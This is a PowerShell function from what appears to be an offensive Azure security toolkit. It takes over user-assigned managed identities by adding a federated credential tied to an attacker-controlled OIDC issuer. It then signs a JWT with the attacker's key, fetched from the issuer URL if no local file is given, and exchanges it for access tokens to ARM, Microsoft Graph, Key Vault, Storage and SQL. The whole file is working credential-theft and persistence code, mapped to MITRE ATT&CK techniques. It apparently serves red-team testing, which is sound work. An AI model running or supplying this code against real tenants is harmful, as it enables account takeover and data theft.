function Invoke-FederatedTokenExchange {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true, ParameterSetName = "ByResourceId")]
        [Alias('resource-id')]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceIdCompleter(
            "Microsoft.ManagedIdentity/userAssignedIdentities"
        )][string]$Id,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "ByName")]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            "Microsoft.ManagedIdentity/userAssignedIdentities",
            "ResourceGroupName"
        )]
        [Alias('identity-name', 'user-assigned-identity')]
        [string]$Name,

        [Parameter(Mandatory = $false, ParameterSetName = "ByName")]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Azure', 'MSGraph', 'KeyVault', 'Storage', 'SQLDatabase', 'OSSDatabase')]
        [Alias('resource', 'audience', 'aud')]
        [string]$EndpointType = 'Azure',

        [Parameter(Mandatory = $true)]
        [Alias('issuer')]
        [string]$IssuerUrl,

        [Parameter(Mandatory = $false)]
        [Alias('key', 'pem')]
        [string]$PrivateKeyPath,

        [Parameter(Mandatory = $false)]
        [Alias('kid')]
        [string]$KeyId,

        [Parameter(Mandatory = $false)]
        [string]$Subject = 'blackcat-token-exchange',

        [Parameter(Mandatory = $false)]
        [Alias('credential-name')]
        [string]$CredentialName,

        [Parameter(Mandatory = $false)]
        [switch]$Decode,

        [Parameter(Mandatory = $false)]
        [switch]$Cleanup,

        [Parameter(Mandatory = $false)]
        [ValidateSet("Object", "JSON", "CSV", "Table")]
        [Alias("output", "o")]
        [string]$OutputFormat = "Object"
    )

    begin {
        Write-Verbose " Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat

        $stats = @{
            StartTime    = Get-Date
            SuccessCount = 0
            ErrorCount   = 0
        }
        [void] $ResourceGroupName

        $endpoints = @{
            Azure       = 'https://management.azure.com'
            MSGraph     = 'https://graph.microsoft.com'
            KeyVault    = 'https://vault.azure.net'
            Storage     = 'https://storage.azure.com'
            SQLDatabase = 'https://database.windows.net'
            OSSDatabase = 'https://ossrdbms-aad.database.windows.net'
        }
        $resourceUrl = $endpoints[$EndpointType]

        if (-not $CredentialName) {
            $suffix = -join ((97..122) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
            $CredentialName = 'bc-fic-{0}' -f $suffix
        }

        # Auto-download private key from issuer URL if not provided locally
        if (-not $PrivateKeyPath) {
            $keyUrl = '{0}/blackcat-oidc.pem' -f $IssuerUrl.TrimEnd('/')
            Write-Verbose "Downloading private key from: $keyUrl"
            try {
                $pemContent = Invoke-RestMethod -Uri $keyUrl -Method GET -ErrorAction Stop
                Write-Verbose "Private key downloaded successfully"
            }
            catch {
                Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message "Failed to download private key from $keyUrl : $($_.Exception.Message)" -Severity 'Error'
                return
            }
        }
        else {
            if (-not (Test-Path -Path $PrivateKeyPath)) {
                Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message "Private key not found: $PrivateKeyPath" -Severity 'Error'
                return
            }
            $pemContent = Get-Content -Path $PrivateKeyPath -Raw
        }
        $pemClean = $pemContent `
            -replace '-----BEGIN.*-----', '' `
            -replace '-----END.*-----', '' `
            -replace '\s', ''
        $keyBytes = [Convert]::FromBase64String($pemClean)

        $rsa = [System.Security.Cryptography.RSA]::Create()
        if ($pemContent -match 'BEGIN RSA PRIVATE KEY') {
            $rsa.ImportRSAPrivateKey($keyBytes, [ref]$null)
        }
        else {
            $rsa.ImportPkcs8PrivateKey($keyBytes, [ref]$null)
        }

        if (-not $KeyId) {
            try {
                $discUrl = '{0}/.well-known/openid-configuration' -f $IssuerUrl.TrimEnd('/')
                $discoveryParams = @{ Uri = $discUrl; Method= 'GET' }
                $disc = Invoke-RestMethod @discoveryParams
                $jwksParams = @{ Uri = $disc.jwks_uri; Method = 'GET' }
                $jwks = Invoke-RestMethod @jwksParams
                $KeyId = $jwks.keys[0].kid
                Write-Verbose "Auto-detected KeyId: $KeyId"
            }
            catch {
                Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message "Failed to detect KeyId: $($_.Exception.Message)" -Severity 'Error'
                return
            }
        }

        $IssuerUrl = $IssuerUrl.TrimEnd('/')
    }

    process {
        try {
            Write-Host "Federated token exchange..." -ForegroundColor Green

            if ($Name -and -not $Id) {
                Write-Host "  Resolving identity: $Name" -ForegroundColor Cyan
                $uamiParams = @{
                    Name         = $Name
                    OutputFormat = 'Object'
                }
                $uami = Get-ManagedIdentity @uamiParams
                if (-not $uami) {
                    Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message "Identity not found: $Name" -Severity 'Error'
                    $stats.ErrorCount++
                    return
                }
                $Id = $uami.id
                $clientId = $uami.properties.clientId
                $uamiName = $uami.name
            }
            elseif ($Id) {
                $uamiName = ($Id -split '/')[-1]
                Write-Host "  Resolving identity: $uamiName" -ForegroundColor Cyan
                $uamiUri = '{0}{1}?api-version=2023-01-31' -f $script:SessionVariables.armUri, $Id
                $uamiGetParams = @{
                    Uri       = $uamiUri
                    Headers   = $script:authHeader
                    Method    = 'GET'
                    UserAgent = $script:SessionVariables.userAgent
                }
                try {
                    $detail = Invoke-RestMethod @uamiGetParams
                    $clientId = $detail.properties.clientId
                }
                catch {
                    Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message "Identity not found: $Id" -Severity 'Error'
                    $stats.ErrorCount++
                    return
                }
            }

            Write-Host "    Resolved: $uamiName ($clientId)" -ForegroundColor Green
            Write-Host "  Adding federated credential: $CredentialName" -ForegroundColor Cyan

            # Check for existing FIC (leftover from failed run)
            $existingFics = Set-FederatedIdentity -Id $Id -Get
            $stale = $existingFics | Where-Object {
                $_.properties.issuer -eq $IssuerUrl -and $_.properties.subject -eq $Subject
            }

            if ($stale) {
                $staleName = ($stale.name -split '/')[-1]
                Write-Host "    Found existing FIC: $staleName (reusing)" -ForegroundColor Yellow
                $CredentialName = $staleName
            }
            else {
                $ficResult = Set-FederatedIdentity -Id $Id -Name $CredentialName -Issuer $IssuerUrl -Subject $Subject -Confirm:$false
                if (-not $ficResult) {
                    Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message "Failed to create FIC" -Severity 'Error'
                    $stats.ErrorCount++
                    return
                }
            }

            Write-Host "    Subject: $Subject" -ForegroundColor White
            Write-Host "  Waiting for FIC propagation..." -ForegroundColor Yellow
            Start-Sleep -Seconds 15

            Write-Host "  Signing JWT assertion (RS256)..." -ForegroundColor Cyan

            $jwtParams = @{
                Audience          = 'api://AzureADTokenExchange'
                Issuer            = $IssuerUrl
                Subject           = $Subject
                ExpirationMinutes = 10
                RSAKey            = $rsa
                KeyId             = $KeyId
                AdditionalClaims  = @{ jti = [guid]::NewGuid().ToString() }
            }
            $jwt = New-JWT @jwtParams

            $scope = "$resourceUrl/.default"
            Write-Host "  Exchanging assertion for token..." -ForegroundColor Cyan
            Write-Host "    Scope: $scope" -ForegroundColor White

            $tokenUri = 'https://login.microsoftonline.com/{0}/oauth2/v2.0/token' -f $script:SessionVariables.tenantId

            $exchangeBody = @{
                client_id             = $clientId
                grant_type            = 'client_credentials'
                client_assertion_type = (
                    'urn:ietf:params:oauth:client-assertion-type:' +
                    'jwt-bearer'
                )
                client_assertion      = $jwt
                scope                 = $scope
            }

            $tokenParams = @{
                Uri         = $tokenUri
                Method      = 'POST'
                Body        = $exchangeBody
                ContentType = 'application/x-www-form-urlencoded'
            }

            # Retry loop for FIC propagation delays
            $maxRetries = 3
            for ($i = 1; $i -le $maxRetries; $i++) {
                try {
                    $tokenResponse = Invoke-RestMethod @tokenParams
                    break
                }
                catch {
                    $errBody = $null
                    if ($_.ErrorDetails.Message) {
                        try {
                            $errBody = $_.ErrorDetails.Message |
                                ConvertFrom-Json
                        } catch { }
                    }
                    $retryable = (
                        $errBody.error_description -match
                        'AADSTS7002(11|22|23)'
                    )
                    if ($retryable -and $i -lt $maxRetries) {
                        $wait = 5 * $i
                        Write-Host (
                            "    FIC not propagated " +
                            "(attempt $i/$maxRetries)" +
                            ", retrying in ${wait}s..."
                        ) -ForegroundColor Yellow
                        Start-Sleep -Seconds $wait
                        continue
                    }
                    if ($errBody.error_description) {
                        Write-Warning (
                            "Token exchange failed: " +
                            "$($errBody.error_description)"
                        )
                        Write-Host (
                            "    Error: " +
                            "$($errBody.error)"
                        ) -ForegroundColor Red
                        Write-Host (
                            "    Correlation ID: " +
                            "$($errBody.correlation_id)"
                        ) -ForegroundColor Gray
                    }
                    else {
                        Write-Warning (
                            "Token exchange failed: " +
                            "$($_.Exception.Message)"
                        )
                    }
                    $stats.ErrorCount++
                    return
                }
            }

            if (-not $tokenResponse.access_token) {
                Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message 'Token exchange returned no token' -Severity 'Error'
                $stats.ErrorCount++
                return
            }

            Write-Host "    Token acquired successfully" -ForegroundColor Green
            $stats.SuccessCount++
                $expiresOn = (Get-Date).AddSeconds($tokenResponse.expires_in ).ToString('yyyy-MM-dd HH:mm:ss')
                $tokenResult = [PSCustomObject]@{
                Identity = $uamiName
                ClientId = $clientId
                EndpointType = $EndpointType
                Resource     = $resourceUrl
                TokenType    = $tokenResponse.token_type
                AccessToken  = $tokenResponse.access_token
                ExpiresIn    = $tokenResponse.expires_in
                ExpiresOn    = $expiresOn
                IssuerUrl    = $IssuerUrl
                Method       = 'FederatedExchange'
            }

            if ($Decode) {
                Write-Host "  Decoding JWT token..." -ForegroundColor Cyan
                try {
                    $decoded = ConvertFrom-JWT -Base64JWT $tokenResponse.access_token
                    $tokenResult | Add-Member -NotePropertyName 'DecodedToken' -NotePropertyValue $decoded
                    Write-Host "    Audience: $($decoded.aud)" -ForegroundColor White
                    Write-Host "    Object ID: $($decoded.oid)" -ForegroundColor White
                }
                catch {
                    Write-Warning "Decode failed: $($_.Exception.Message)"
                }
            }
        }
        catch {
            Write-Message -FunctionName $MyInvocation.MyCommand.Name -Message $_.Exception.Message -Severity 'Error'
            $stats.ErrorCount++
        }
        finally {
            if ($Cleanup -and $CredentialName) {
                Write-Host "  Removing federated credential..." -ForegroundColor Yellow
                $removed = Set-FederatedIdentity -Id $Id -Name $CredentialName -Remove -Confirm:$false
                if ($removed) {
                    Write-Host "    FIC removed" -ForegroundColor Green
                }
            }
            if ($rsa) { $rsa.Dispose() }
        }
    }

    end {
        $duration = (Get-Date) - $stats.StartTime
        Write-Verbose " Completed function $($MyInvocation.MyCommand.Name) in $($duration.TotalSeconds.ToString('F2'))s"

        if ($tokenResult) {
            Format-BlackCatOutput -Data $tokenResult -OutputFormat $OutputFormat -FunctionName $MyInvocation.MyCommand.Name
        }
        else {
            Write-Warning "Token exchange failed - no token retrieved (Errors: $($stats.ErrorCount))"
        }
    }

    <#
    .SYNOPSIS
        Extracts UAMI token via federated credential injection (~20s).

    .DESCRIPTION
        Obtains access token by injecting FIC, signing JWT with
        attacker RSA key, exchanging at Entra endpoint. Requires
        pre-configured OIDC issuer (storage blob with JWKS).

    .PARAMETER Id
        Full ARM resource ID of UAMI.

    .PARAMETER Name
        UAMI display name (resolved via Get-ManagedIdentity).

    .PARAMETER ResourceGroupName
        Resource group for tab-completion. Not required.

    .PARAMETER EndpointType
        Target: Azure (ARM), MSGraph, KeyVault, Storage,
        SQLDatabase, OSSDatabase.

    .PARAMETER IssuerUrl
        OIDC issuer URL
        (e.g., https://myoidc.blob.core.windows.net/oidc).

    .PARAMETER PrivateKeyPath
        Path to RSA private key PEM (PKCS1/PKCS8). Optional:
        auto-downloads from {IssuerUrl}/private-key.pem if not
        provided.

    .PARAMETER KeyId
        JWT 'kid' claim (auto-detected from JWKS if omitted).

    .PARAMETER Subject
        Subject claim for FIC/JWT
        (default: 'blackcat-token-exchange').

    .PARAMETER CredentialName
        FIC name (auto-generated if omitted: bc-fic-<random>).

    .PARAMETER Decode
        Decode JWT using ConvertFrom-JWT.

    .PARAMETER Cleanup
        Remove FIC after token extraction.

    .PARAMETER OutputFormat
        Output format: Object (default), JSON, CSV, or Table.

    .EXAMPLE
        Invoke-FederatedTokenExchange -Name uami-prod `
            -IssuerUrl https://bc.blob.core.windows.net/oidc `
            -Cleanup
        
        Auto-downloads private key from issuer URL.

    .EXAMPLE
        Invoke-FederatedTokenExchange -Name uami-cicd `
            -IssuerUrl https://bc.blob.core.windows.net/oidc `
            -PrivateKeyPath ./key.pem -Cleanup
        
        Uses local private key file.

    .EXAMPLE
        Invoke-FederatedTokenExchange -Name uami-automation `
            -IssuerUrl https://bc.blob.core.windows.net/oidc `
            -EndpointType MSGraph -Decode
        
        Auto-downloads key, extracts Graph token, decodes JWT.

    .OUTPUTS
        [PSCustomObject]
        Returns objects with properties:
        - Identity: UAMI name
        - ClientId: UAMI client ID (GUID)
        - EndpointType: Friendly endpoint name
        - Resource: Full resource URL
        - TokenType: Token type (Bearer)
        - AccessToken: JWT access token
        - ExpiresIn: Seconds until expiration
        - ExpiresOn: Expiration timestamp
        - IssuerUrl: OIDC issuer URL
        - Method: 'FederatedExchange'
        - DecodedToken: Decoded JWT claims (if -Decode)

    .NOTES
        Author: Rogier Dijkman
        
        Required permissions:
        - Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write
        - Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/delete

    .LINK
        MITRE ATT&CK Tactic: TA0006 - Credential Access
        https://attack.mitre.org/tactics/TA0006/

    .LINK
        MITRE ATT&CK Technique: T1528 - Steal Application Access Token
        https://attack.mitre.org/techniques/T1528/

    .LINK
        MITRE ATT&CK Technique: T1098.001 - Additional Cloud Credentials
        https://attack.mitre.org/techniques/T1098/001/
    #>
}